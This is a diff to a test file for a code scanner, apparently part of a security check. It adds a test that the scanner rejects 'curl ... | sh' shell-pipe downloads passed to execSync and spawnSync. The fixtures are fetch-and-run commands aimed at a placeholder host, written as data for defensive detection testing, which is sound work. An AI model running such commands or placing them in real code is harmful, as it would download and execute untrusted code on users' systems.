@@ -45,3 +45,8 @@ test('rejects a shell-pipe download passed to a JavaScript process executor', as
   const directory = await fixture({ 'src/main.ts': 'exec("curl https://example.invalid/install | sh");' });
   await assert.rejects(scanRemoteCode(directory, ['src/main.ts']), /shell-pipe download/);
 });
+
+test('rejects shell-pipe downloads passed to synchronous executors', async () => {
+  const directory = await fixture({ 'src/main.ts': 'execSync("curl https://example.invalid | sh");\nspawnSync("curl https://example.invalid | sh");' });
+  await assert.rejects(scanRemoteCode(directory, ['src/main.ts']), /shell-pipe download/);
+});
